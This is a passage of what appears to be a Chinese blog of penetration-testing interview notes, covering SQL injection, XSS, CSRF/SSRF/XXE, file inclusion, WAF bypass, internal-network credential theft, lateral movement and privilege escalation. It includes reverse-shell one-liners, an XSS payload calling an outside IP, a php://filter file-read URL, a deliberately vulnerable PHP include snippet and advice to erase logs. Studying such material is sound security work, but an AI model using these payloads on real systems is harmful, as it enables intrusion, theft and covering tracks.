href="#sqlmap中os-shell的原理及利用条件"></a> sqlmap中–os-shell的原理及利用条件</h3><ul><li>利用条件<ul><li>root权限</li><li>知道绝对路径，Secure_file_priv参数为空或者为指定路径</li><li>GPC关闭</li></ul></li><li>原理及流程：利用SQL注入，通过数据库的外连功能，将一句话木马或者其他可执行文件写入到服务器的web目录下，利用shell传参进行命令执行，退出时删除shell</li><li>当然数据库不同，必要条件也不同，例如<strong>sqlserver需要数据库支持外连</strong>，数据库权限为SA权限，主要利用xp_cmdshell扩展进行命令执行。</li><li>原理细致分析：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7942#toc-4">https://xz.aliyun.com/t/7942#toc-4</a></li></ul><h3 id="xp_cmdshell有什么限制"><a class="markdownIt-Anchor" href="#xp_cmdshell有什么限制"></a> xp_cmdshell有什么限制？</h3><p>只能用在mssql上</p><h3 id="sqlmap如何判断一个网站是否存在sql注入漏洞"><a class="markdownIt-Anchor" href="#sqlmap如何判断一个网站是否存在sql注入漏洞"></a> sqlmap如何判断一个网站是否存在sql注入漏洞？</h3><p>主要还是手工那一套，然后通过<code>-f</code>来看看数据库类型</p><h3 id="sqlmap如何列出数据库表和字段"><a class="markdownIt-Anchor" href="#sqlmap如何列出数据库表和字段"></a> sqlmap如何列出数据库，表和字段？</h3><p><code>-D</code>、<code>-</code></p><h3 id="sqlmap如何执行任意sql语句和系统命令"><a class="markdownIt-Anchor" href="#sqlmap如何执行任意sql语句和系统命令"></a> sqlmap如何执行任意sql语句和系统命令？</h3><h3 id="sqlmap如何绕过waf和防火墙"><a class="markdownIt-Anchor" href="#sqlmap如何绕过waf和防火墙"></a> sqlmap如何绕过waf和防火墙？</h3><h3 id="找到一个注入点怎么判断对方什么数据库"><a class="markdownIt-Anchor" href="#找到一个注入点怎么判断对方什么数据库"></a> 找到一个注入点怎么判断对方什么数据库</h3><p>常用数据库有：</p><blockquote><p>mysql 3306 | mssql 1433 | oracle 1521 | access是文件型数据库不需要端口号</p></blockquote><ol><li>特定的错误<ul><li>MySQL：有MySQL字样</li><li>MSSQL：包含Microsoft ODBC字样</li><li>Oracle：包含ORA…字样</li><li>Access：包含Microsoft JET字样</li></ul></li><li>使用特定函数</li><li>使用特定表<ol><li>mssql：systemobject</li><li>Oracle：dual</li><li>mysql：information_schema</li></ol></li></ol><h3 id="access扫出后缀为asp的数据库文件访问乱码-如何实现到本地利用"><a class="markdownIt-Anchor" href="#access扫出后缀为asp的数据库文件访问乱码-如何实现到本地利用"></a> access扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用</h3><p>迅雷下载改后缀为<code>.mdb</code></p><h2 id="xsscorsjsonpcsp"><a class="markdownIt-Anchor" href="#xsscorsjsonpcsp"></a> XSS/CORS/JSONP/CSP</h2><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/XSSCORSJSONPCSP.png" alt="XSSCORSJSONPCSP"></p><h3 id="输出到href的xss如何防御"><a class="markdownIt-Anchor" href="#输出到href的xss如何防御"></a> 输出到href的XSS如何防御</h3><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53008479/article/details/124487401">https://blog.csdn.net/m0_53008479/article/details/124487401</a></p><p>输出出现在<strong>a标签的href属性</strong>里面，可以使用<strong>javascript协议</strong>来执行js</p><ol><li><strong>限制协议</strong>：a标签的href属性中一般放的是URL（链接），所以我们可以规定， 这里的输入<strong>必须以http或者https开头</strong>，否则不予以输入。</li><li><strong>实体编码</strong>：再对这里进行<code>htmlspecialchars($str, ENT_QUOTES);</code>函数处理。（注：这个函数是把html特殊字符转为html实体）</li></ol><h3 id="xss的防护方法有哪些httponly如何绕过"><a class="markdownIt-Anchor" href="#xss的防护方法有哪些httponly如何绕过"></a> XSS的防护方法有哪些？httponly如何绕过？</h3><p>防护：</p><ol><li>对输入输出进行实体编码，即纯前端渲染</li><li>过滤关键词，例如script等</li><li>httponly，禁止js前端读取cookie</li></ol><p>绕过：</p><ol><li><p>用密码登录</p><ol><li>XSS伪造表单，记录登录账号密码，直接登进去</li><li>获取浏览器里面的账号密码</li><li>键盘记录</li></ol></li><li><p>利用其他漏洞：CORS、phpinfo、Apache</p><ul><li><p>phpinfo里有：<code>$_SERVER['HTTP_COOKIE']</code></p></li><li><p>Apache：漏洞CVE-2012-0053，植入超大COOKIE，报400错误，里面有cookie</p></li><li><p>CORS：<code>Access-Control-Allow-Origin:*</code>，构造CORS跨域能获取敏感信息的HTML，放在我们的服务器中，然后嵌入script：<code>windows.open(我们服务器的EXP)</code>，即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;x&quot;</span> οnerrοr=<span class="attr">javascript</span>:<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;http://192.168.38.1/cors.html&quot;</span>)&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ol><blockquote><p>Host/Referer/Origin的区别</p><ol><li>Host：去哪里，域名+端口</li><li>Referer：来自哪里，协议+域名+端口+路径+参数</li><li>Origin：来自哪里（跨域），协议+域名+端口</li></ol></blockquote><h2 id="csrfssrfxxe"><a class="markdownIt-Anchor" href="#csrfssrfxxe"></a> CSRF/SSRF/XXE</h2><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/CSRFSSRFXXE.png" alt="CSRFSSRFXXE"></p><h3 id="csrf与xss的区别"><a class="markdownIt-Anchor" href="#csrf与xss的区别"></a> CSRF与XSS的区别</h3><table><thead><tr><th></th><th>CSRF</th><th>XSS</th></tr></thead><tbody><tr><td>手法</td><td>诱导用户访问已登录的网站，完成用户非预期操作</td><td>诱导用户触发js脚本，执行js脚本，如获取cookie</td></tr></tbody></table><h3 id="samesite防御csrf的原理"><a class="markdownIt-Anchor" href="#samesite防御csrf的原理"></a> samesite防御CSRF的原理</h3><blockquote><p>服务器可以在设置cookie时指定SameSite属性，以表明当来自外部站点时不应该发送cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: JSESSIONID=randomid; Domain=bank.example.com; Secure; HttpOnly; SameSite=Lax</span><br></pre></td></tr></table></figure></blockquote><h3 id="xxe的危害哪些地方容易存在xxexxe架构方面有没有了解过"><a class="markdownIt-Anchor" href="#xxe的危害哪些地方容易存在xxexxe架构方面有没有了解过"></a> XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过？</h3><p>危害：</p><ul><li>能够引入恶意的外部实体，执行任意命令、文件读取、内网探测（可以使用协议gopher、file、dict、http）、攻击内网服务等</li></ul><p>出现点：</p><ul><li>与SSRF出现的点差不多，例如在线功能（pdf在线解析、word在线解析），留言板等</li></ul><p>防范：</p><ol><li>禁止外部实体</li><li>过滤提交的XML</li></ol><p>架构：</p><ol><li><p>客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析</p></li><li><p>Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.stream.XMLStreamReader;</span><br><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br></pre></td></tr></table></figure></li></ol><h3 id="ssrf怎么用redis写shell"><a class="markdownIt-Anchor" href="#ssrf怎么用redis写shell"></a> ssrf怎么用redis写shell</h3><ol><li>使用dict协议获取banner：<code>dict://&lt;ip&gt;/info</code>，得到redis版本</li><li>使用gopher协议操作redis，将请求操作（redis操作）的数据包编码，使用该协议发送即可</li><li>利用redis将反弹shell写入计划任务等操作，获得shell</li></ol><h3 id="json格式的csrf如何防御"><a class="markdownIt-Anchor" href="#json格式的csrf如何防御"></a> json格式的CSRF如何防御</h3><ul><li>启用CSRF令牌</li></ul><p>{ “name”: “John”, “age”: 30, “csrf_token”: “random_string_here” }</p><ul><li>使用SameSite Cookie<ul><li>具体实现方式可以在每个JSON请求中添加一个带有SameSite属性的Cookie，如下所示。<ul><li>Cookie: session_id=random_string_here; SameSite=Strict</li></ul></li></ul></li></ul><h2 id="文件包含文件上传目录遍历目录穿越"><a class="markdownIt-Anchor" href="#文件包含文件上传目录遍历目录穿越"></a> 文件包含/文件上传/目录遍历/目录穿越</h2><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8C%85%E5%90%AB%E8%AF%BB%E5%8F%96%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A.png" alt="文件上传包含读取目录穿越"></p><h3 id="文件包含getshell思路"><a class="markdownIt-Anchor" href="#文件包含getshell思路"></a> 文件包含getshell思路</h3><p>上传/写入webshell，并知道shell目录</p><ol><li><p>通过文件上传的方式上传可执行文件到已知目录，可以是图片码（这个可以通过htaccess或者解析漏洞）</p></li><li><p>通过错误日志（例如apache，nginx），写shell</p></li><li><p>通过伪协议：</p><ol><li><p><code>php://input</code>，执行PHP代码（该内容在post-data中）</p></li><li><p><code>php://filter</code>，读取敏感文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?file=php://filter/convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure></li></ol></li></ol><p>免杀shell，可以参考项目</p><h3 id="php的00截断的原理是什么"><a class="markdownIt-Anchor" href="#php的00截断的原理是什么"></a> php的%00截断的原理是什么？</h3><ul><li>因为在C语言中字符串的结束标识符%00是结束符号，而PHP就是C写的，所以继承了C的特性，所以判断为%00是结束符号不会继续往后执行</li><li>条件：PHP&lt;5.3.29，且GPC关闭。</li></ul><h3 id="php的lfi本地包含漏洞原理是什么写一段带有漏洞的代码-手工的话如何发掘如果无报错回显你是怎么遍历文件的"><a class="markdownIt-Anchor" href="#php的lfi本地包含漏洞原理是什么写一段带有漏洞的代码-手工的话如何发掘如果无报错回显你是怎么遍历文件的"></a> php的LFI（本地包含漏洞）原理是什么？写一段带有漏洞的代码。手工的话如何发掘？如果无报错回显，你是怎么遍历文件的？</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：</p><ul><li>包含的文件设置为变量</li><li>变量无过滤导致可以调用恶意文件 还可以对远程文件包含，但需要开启<code>allow_url_include = ON</code>。</li></ul><p>测试：</p><ul><li>通过测试参数的地方进行本地文件/etc/passwd等包含</li></ul><p>无报错如何遍历文件：</p><ul><li>为何存在漏洞而且没有回显：有可能没有显示在页面而是在网页源代码中</li><li>遍历文件：<ul><li>利用DNSlog进行获取包含的信息。从index.php文件一级级往读取</li><li>可以利用PHP封装协议读取文件，例如file协议等。</li></ul></li></ul><h2 id="反序列化漏洞"><a class="markdownIt-Anchor" href="#反序列化漏洞"></a> 反序列化漏洞</h2><h3 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h3><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP反序列化" style="zoom:33%"><h3 id="java"><a class="markdownIt-Anchor" href="#java"></a> JAVA</h3><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80.png" alt="JAVA反序列化基础" style="zoom:33%"><h2 id="其他-2"><a class="markdownIt-Anchor" href="#其他-2"></a> 其他</h2><h3 id="ddos攻击"><a class="markdownIt-Anchor" href="#ddos攻击"></a> DDoS攻击</h3><p>客户端向服务端发送请求链接数据包，服务端向客户端发送确认数据包，<strong>客户端不向服务端发送确认数据包，服务器一直等待来自客户端的确认</strong></p><p>没有彻底根治的办法，除非不使用TCP</p><p>DDos预防：</p><p>（1）限制同时打开SYN半链接的数目</p><p>（2）缩短SYN半链接的Time out 时间</p><p>（3）关闭不必要的服务</p><h3 id="web典型漏洞有"><a class="markdownIt-Anchor" href="#web典型漏洞有"></a> WEB典型漏洞有</h3><ul><li>Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)：该漏洞是由于Exchange控制面板（ECP）组件中使用了静态密钥validationKey和decryptionKey。</li><li>Apache Tomcat 文件包含漏洞(CVE-2020-1938)：默认情况下,Tomcat会开启AJP连接器, Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的请求,可以读取或者包含Web根目录下的任意文件,配合文件上传，将导致任意代码执行(RCE)。</li><li>Weblogic IIOP反序列化漏洞（CVE-2020-2551）：weblogic核心组件中IIOP协议，通过该协议对存在漏洞的WebLogic进行远程代码执行的攻击。Apache Solr远程代码执行（CVE-2019-12409）：<a target="_blank" rel="noopener" href="http://xn--solr-p85f980jg51brouvuls46a.in.sh">默认配置文件solr.in.sh</a>,在其配置文件中ENABLE_REMOTE_JMX_OPTS字段默认配置不安全.如果使用默认配置,将启用JMX监视服务并将对公网监听18983的RMI端口,无需任何验证,配合JMXRMI远程代码执行。</li><li>SHIRO-550 反序列化漏洞：shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化。AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞。</li><li>SHIRO-721反序列化漏洞：不需要key，利用PaddingOracle Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击。</li><li>泛微Ecology OA SQL注入漏洞：validate.jsp接口的SQL注入，/cpt/manage/validate.jsp。泛微ecology OA系统接口存在数据库配置信息泄露：/mobile/dbconfigreader.jsp,直接访问该页面将为DES加密以后的乱码,使用DES算法结合硬编码的key进行解密。</li><li>Confluence 本 地 文 件 泄 露 漏 洞 (CVE-2019-3394)catalina.jar中的org.apache.catalina.webresources.StandardRoot.class的getResource方法的validate存在过滤和限制，所以可遍历路径均在/WEB-INF下。</li><li>Apache Dubbo反序列化漏洞（CVE-2019-17564）：当HTTP remoting 开启的时候，存在反序列化漏洞。</li></ul><h1 id="渗透流程"><a class="markdownIt-Anchor" href="#渗透流程"></a> 渗透流程</h1><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><h3 id="搜集注册人邮箱有什么价值"><a class="markdownIt-Anchor" href="#搜集注册人邮箱有什么价值"></a> 搜集注册人邮箱有什么价值</h3><ol><li>丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台</li><li>用邮箱做关键词进行丢进搜索引擎</li><li>利用搜索到的关联信息找出其他邮箱进而得到常用社交账号</li><li>社工找出社交账号，里面或许会找出管理员设置密码的习惯</li><li>利用已有信息生成专用字典</li><li>观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西</li></ol><h3 id="域名泛解析怎么处理"><a class="markdownIt-Anchor" href="#域名泛解析怎么处理"></a> 域名泛解析怎么处理</h3><p>域名泛解析就是利用通配符<code>*</code>（星号）来做次级域名以实现<strong>所有的次级域名均指向同一IP地址</strong>。如果使用Layer爆破域名得到的均会是200成功状态码，而且ttl基本一样。</p><p>判断：ping一个不可能存在的域名，如果成功了，那么就存在域名泛解析</p><p>对抗：采用<strong>IP黑名单</strong>方式。</p><ul><li>首先确定黑名单IP：多次ping随机域名，搜集固定ttl和多次出现的IP，制作黑名单</li><li>使用域名字典扫，过滤固定ttl和IP黑名单。在泛解析记录中TTL是相同的，如果TTL不相同，则不是泛解析记录。</li></ul><h3 id="cdn是什么"><a class="markdownIt-Anchor" href="#cdn是什么"></a> CDN是什么</h3><p>CDN是一组不同运行商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源（html、css、js、图片等文件）直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，只有实际产生业务交互的时候，才会与真正的服务器进行交互</p><h3 id="cdn怎么判断"><a class="markdownIt-Anchor" href="#cdn怎么判断"></a> CDN怎么判断</h3><ol><li>多地ping，看是否有多个IP</li><li>查看响应包中是否有cdn字样</li><li>查看nslookup，看有没有多个IP地址</li></ol><h3 id="如何绕过cdn"><a class="markdownIt-Anchor" href="#如何绕过cdn"></a> 如何绕过CDN</h3><ol><li>通过邮件返回的地址解析</li><li>DNS历史查看</li><li>子域名IP查看</li><li>国外访问域名（国外ping）</li><li>文件phpinfo</li></ol><h3 id="phpinfo你会关注哪些信息"><a class="markdownIt-Anchor" href="#phpinfo你会关注哪些信息"></a> phpinfo你会关注哪些信息</h3><ol><li><p>绝对路径<code>(_SERVER[“SCRIPT_FILENAME”])</code></p><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/6d50a4d95030412fafc05904c6f6bbad.png" alt="请添加图片描述"></p></li><li><p>支持程序（中间件），如redis、curl、mysql看是否支持gopher，是否开启fastcgi</p></li><li><p>真实<code>IP_SERVER[“SERVER_ADDR”]</code></p></li><li><p>敏感配置：</p><p><code>allow_url_include</code>：远程文件包含</p><p><code>allow_url_fopen</code>：远程文件读取</p><p><code>disable_functions</code>：表示禁用的函数名</p><p><code>open_basedir</code>：可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径</p><p><code>short_open_tag</code>：允许<code>&lt;??&gt;</code>这种形式，并且<code>&lt;?=</code>等价于<code>&lt;? echo</code></p></li><li><p><code>php.ini</code>配置文件配置：<code>Loaded Configuration File</code></p></li></ol><h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2><h3 id="有一个登录框你的渗透思路是什么"><a class="markdownIt-Anchor" href="#有一个登录框你的渗透思路是什么"></a> 有一个登录框，你的渗透思路是什么？</h3><ol><li>【登录】看存不存在sql注入漏洞（万能密码），尝试爆破</li><li>【框架、组件】看看是什么框架，用了什么组件，看存不存在未授权或者其他rce漏洞</li><li>【敏感信息】F12看看网络和源码，寻找有没有敏感信息泄露</li><li>【逻辑漏洞】<ol><li>注册：超长用户名进行覆盖</li><li>找回密码：看返回包有没有<strong>信息泄露</strong>，可不可以预测/更改相关参数，造成<strong>任意密码重置</strong></li><li>验证码：不刷新、没有登录次数限制、可复用/预测、数据包可添加多个手机号</li><li>越权：cookie修改、cookie简单可预测</li></ol></li></ol><h3 id="如何手工判断对方操作系统"><a class="markdownIt-Anchor" href="#如何手工判断对方操作系统"></a> 如何手工判断对方操作系统？</h3><ul><li>修改url中参数，改成大写，正常为windows，不正常即为linux（windows不区分大小写，而linux区分）</li><li>ping服务器，返还得TTL值不一样，windows一般在100以上，linux一般是100以下。</li><li>查看数据包HTTP报头，如果是iis那就肯定是windows</li></ul><h3 id="给你一个目标如何进行渗透测试"><a class="markdownIt-Anchor" href="#给你一个目标如何进行渗透测试"></a> 给你一个目标，如何进行渗透测试</h3><ol><li>获得更多信息<ol><li>真实IP：看是否使用了CDN</li><li>子域名/旁站/C段，以及相似域名（查看该公司的资产结构，例如whois信息、招聘信息、天眼查）</li><li>是否存在waf</li></ol></li><li>对这些域名站点进行渗透<ol><li>是否使用了框架，并查看是否有历史漏洞</li><li>是否使用了有漏洞的中间件</li><li>是否使用了CMS，并查看是否有历史漏洞</li><li>点功能点，看历史请求，重点观察输入输出窗口、上传窗口，js相应API等。对每个可能的漏洞点进行测试，查看是否存在SQL/XSS/未授权访问等等漏洞</li><li>扫目录，看是否存在后台（弱口令）/敏感文件/备份文件</li></ol></li><li>漏洞利用与权限提升<ol><li>使用数据库提升权限（mysql udf、sqlserver xp_cmdshell等）</li><li>使用Linux/Windows的历史漏洞（烂土豆+令牌劫持、脏牛等等）</li></ol></li><li>清除日志数据+生成报告</li></ol><h3 id="给你一个网站你如何判断框架struts2-shiro-springboot"><a class="markdownIt-Anchor" href="#给你一个网站你如何判断框架struts2-shiro-springboot"></a> 给你一个网站，你如何判断框架（struts2、shiro、springboot）</h3><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/Web%E5%BA%94%E7%94%A8%E6%8C%87%E7%BA%B9%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF.png" alt="Web应用指纹分析思路" style="zoom:33%"><p>要判断一个网站使用的是什么框架，可以通过以下几种方式：</p><ol><li><p>查看源代码</p><ul><li>如果能看到power by …</li><li>如果能看到特殊标签：<code>&lt;s:form&gt;</code>…</li></ul></li><li><p>看HTTP请求头：</p><ul><li>X-Work…：直接判断是struts2、springboot</li><li>URL：如果有do、action等等</li></ul></li><li><p>看HTTP cookie</p><p>如果有remember me就可能是shiro</p></li></ol><p>以上方法可以帮助你判断一个网站使用了什么样的框架，包括但不限于Struts2、Shiro、SpringBoot等。</p><h2 id="渗透技巧"><a class="markdownIt-Anchor" href="#渗透技巧"></a> 渗透技巧</h2><h3 id="常用waf绕过手法"><a class="markdownIt-Anchor" href="#常用waf绕过手法"></a> 常用WAF绕过手法</h3><p>这里从以sql注入为例，从三个层面简单总结一下手法。</p><ol><li><p>从架构层面：找到服务器真实IP，同网段绕过，http和https同时开放服务绕过，边缘资产漏洞利用绕过。</p></li><li><p>从协议层面：分块延时传输，利用pipline绕过，利用协议未覆盖绕过，POST及GET提交绕过。</p></li><li><p>从规则层面：编码绕过，等价符号替换绕过，普通注释和内敛注释，缓冲区溢出，mysql黑魔法，白名单及静态资源绕过，文件格式绕过，参数污染。</p></li></ol><h3 id="反弹shell的常用命令"><a class="markdownIt-Anchor" href="#反弹shell的常用命令"></a> 反弹shell的常用命令</h3><ol><li><code>nc -lvvp 7777 -e /bin.bash</code></li><li><code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;</code></li></ol><h1 id="内网渗透"><a class="markdownIt-Anchor" href="#内网渗透"></a> 内网渗透</h1><p><img src="/images/%E9%9D%A2%E8%AF%95%E6%95%B4%E7%90%86/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E4%BA%8C.png" alt="内网安全二"></p><h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2><h3 id="内网渗透思路"><a class="markdownIt-Anchor" href="#内网渗透思路"></a> 内网渗透思路</h3><ol><li>代理渗透</li><li>权限维持</li><li>内网信息搜集</li><li>口令爆破</li><li>凭证窃取</li><li>横向渗透</li><li>拿下域控</li></ol><h3 id="内网抓取密码如何抓"><a class="markdownIt-Anchor" href="#内网抓取密码如何抓"></a> 内网抓取密码如何抓</h3><ul><li>可以直接使用mimikatz</li><li>也可以使用procdump，弄下来，然后再离线mimikatz读取</li></ul><h3 id="操作系统什么版本之后抓不到密码抓不到怎么办"><a class="markdownIt-Anchor" href="#操作系统什么版本之后抓不到密码抓不到怎么办"></a> 操作系统什么版本之后抓不到密码？抓不到怎么办</h3><ul><li>windows server 2012之后</li><li>方法：<ul><li>翻阅文件查找运维等等是否记录密码。</li><li>或者hash传递。</li><li>或者获取浏览器的账号密码等等。</li></ul></li></ul><h3 id="内网免杀了解过吗有哪些方法"><a class="markdownIt-Anchor" href="#内网免杀了解过吗有哪些方法"></a> 内网免杀了解过吗？有哪些方法</h3><ol><li>Powershell无文件落地执行</li><li>静态文件免杀：通过修改文件特征马或者加壳</li></ol><p>常用的免杀工具有<code>AVlator</code></p><h3 id="如果拿到域控如何批量判断哪个主机是出网的哪个是不出网"><a class="markdownIt-Anchor" href="#如果拿到域控如何批量判断哪个主机是出网的哪个是不出网"></a> 如果拿到域控，如何批量判断哪个主机是出网的，哪个是不出网？</h3><p>通过组策略，执行命令：<code>ping</code>、<code>curl</code>等</p><h2 id="综合"><a class="markdownIt-Anchor" href="#综合"></a> 综合</h2><h3 id="域信息的搜集思路"><a class="markdownIt-Anchor" href="#域信息的搜集思路"></a> 域信息的搜集思路</h3><ul><li>判断是否存在域</li><li>定位域控</li><li>域基本信息查询（所有域、域信任信息、域密码策略）</li><li>域内用户查询（定位域管）</li><li>域内主机查询</li><li>BloodHound工具</li></ul><h3 id="常见的有什么工具"><a class="markdownIt-Anchor" href="#常见的有什么工具"></a> 常见的有什么工具</h3><p>fscan、adfind、rebues、mimikatz、bloodhound、cs、kerberoasting、powersploit（powerview）、empire、impacket</p><h2 id="横向渗透"><a class="markdownIt-Anchor" href="#横向渗透"></a> 横向渗透</h2><h3 id="kerberos协议的流程"><a class="markdownIt-Anchor" href="#kerberos协议的流程"></a> Kerberos协议的流程</h3><ol><li>主机向KDC发起AS-REQ请求，而KDC返回TGT票据</li><li>主机向KDC发起服务ST请求，而KDC返回TGS票据</li><li>主机拿着TGS访问指定的服务</li></ol><h3 id="kerberos有什么漏洞"><a class="markdownIt-Anchor" href="#kerberos有什么漏洞"></a> Kerberos有什么漏洞</h3><ol><li>ms14-068</li><li>as-req roasting</li><li>kerberoasting</li><li>委派攻击</li></ol><h3 id="ptt-pth-ptk的区别"><a class="markdownIt-Anchor" href="#ptt-pth-ptk的区别"></a> PTT、PTH、PTK的区别</h3><p>PTT是票据传递，一般使用伪造的金银票据注入到内存里面，访问服务，例如mssql等</p><p>PTH是哈希传递，通过抓取内存里面的NTLM哈希，便可以使用impacket工具，横向移动，运行命令</p><p>PTK是在windows发布了补丁后提出的，使用aesKey进行连接，此时PTH只能使用管理员账户的NTLM才能连接</p><h3 id="横向命令执行手段"><a class="markdownIt-Anchor" href="#横向命令执行手段"></a> 横向命令执行手段</h3><p>可以使用：smbexec，wmiwexec，psexec，dromexec，winrm</p><p>还可以使用ipc连接，例如net use</p><h3 id="psexec和wimc或者其他的区别"><a class="markdownIt-Anchor" href="#psexec和wimc或者其他的区别"></a> psexec和wimc或者其他的区别</h3><p>psexec会记录大量日志，而wmic不会（隐蔽）</p><h2 id="权限提升与权限维持"><a class="markdownIt-Anchor" href="#权限提升与权限维持"></a> 权限提升与权限维持</h2><h3 id="数据库提权"><a class="markdownIt-Anchor" href="#数据库提权"></a> 数据库提权</h3><p><strong>Mysql数据库</strong></p><ol><li>UDF提权<ul><li>用户自定义函数提权</li><li>添加新的函数，实现功能拓展</li><li>将恶意so文件放在<code>lib/plugin</code>里面，然后加载就好了</li></ul></li><li>MOF提权<ul><li>托管对象格式，每5秒监控进程的创建和死亡</li><li>存储路径（覆盖）：<code>c:/windows/system32/wbem/mof/nullevt.mof</code></li><li>与UDF一样，使用load_file和dumpfile函数输出到指定目录即可</li><li>一般用于cmd创建一个管理员权限用户或者反弹shell（恶意Mof文件）</li></ul></li></ol><p><strong>MSSQL提权</strong></p><ol><li><p>xp_cmdshell</p><ul><li><p>扩展存储过程</p><blockquote><p>xp_cmdshell是一个扩展存储过程，<strong>它可以让SQL Server调用操作系统的命令行</strong>，执行一些系统命令或者程序。<strong>存储过程是一种预编译的SQL语句集合，它可以在数据库中创建和保存，方便重复使用</strong>。而xp_cmdshell是特殊的存储过程。</p></blockquote></li><li><p>前提sqlserver服务未降权，有sa权限</p></li><li><p>让管理员有操作cmd的权限，并且以文本的形式输出</p></li></ul></li><li><p>sp_oacreate</p><ul><li>调用OLE组件</li><li>OLE是一个API接口，里面包含了可以重复使用的软件组件</li></ul></li></ol><h3 id="windows提权思路"><a class="markdownIt-Anchor" href="#windows提权思路"></a> windows提权思路</h3><ul><li>系统内核溢出提权；</li><li>数据库提权；</li><li>错误的系统配置提权；</li><li>DLL劫持提权；</li><li>特权第三方软件or服务提权；</li><li>令牌窃取提权；</li><li>web中间件漏洞提权；</li><li>AT，SC，PS提权等等；</li></ul><h3 id="linux提权思路"><a class="markdownIt-Anchor" href="#linux提权思路"></a> linux提权思路</h3><ul><li>suid提权</li><li>sudoer提权</li><li>脏牛提权（内核溢出漏洞）</li><li>环境变量提权</li><li>数据库提权</li></ul><h3 id="什么是黄金票据-白银票据"><a class="markdownIt-Anchor" href="#什么是黄金票据-白银票据"></a> 什么是黄金票据、白银票据</h3><h2 id="隧道代理"><a class="markdownIt-Anchor" href="#隧道代理"></a> 隧道代理</h2><h3 id="目标机器ping不通外网没有办法走网络层协议如何搭建隧道"><a class="markdownIt-Anchor" href="#目标机器ping不通外网没有办法走网络层协议如何搭建隧道"></a> 目标机器ping不通外网，没有办法走网络层协议，如何搭建隧道</h3><p>可以使用基于webshell的内网隧道，例如neo-regeorg还有pystinger。</p><p>如果禁用了一些协议，可使用其他隧道，例如icmp隧道</p><h3 id="正向代理与反向代理的区别"><a class="markdownIt-Anchor" href="#正向代理与反向代理的区别"></a> 正向代理与反向代理的区别</h3><ol><li>正向代理是攻击方连接受害者的监听端口，反向代理是受害方主动请求连接攻击方监听的端口</li><li>正向代理一般是用于连接不出网的机器，而反向代理可以突破防火墙过滤功能。</li></ol><h3 id="内网的多级代理用什么进行代理"><a class="markdownIt-Anchor" href="#内网的多级代理用什么进行代理"></a> 内网的多级代理用什么进行代理</h3><p>可以使用venom、FRP之类的</p><h3 id="如果tcp和udp不出网用什么策略进行代理搭建"><a class="markdownIt-Anchor" href="#如果tcp和udp不出网用什么策略进行代理搭建"></a> 如果tcp和udp不出网，用什么策略进行代理搭建</h3><p>采用隧道，例如DNS和ICMP隧道</p><h2 id="域相关"><a class="markdownIt-Anchor" href="#域相关"></a> 域相关</h2><h3 id="域内攻击有什么方法"><a class="markdownIt-Anchor" href="#域内攻击有什么方法"></a> 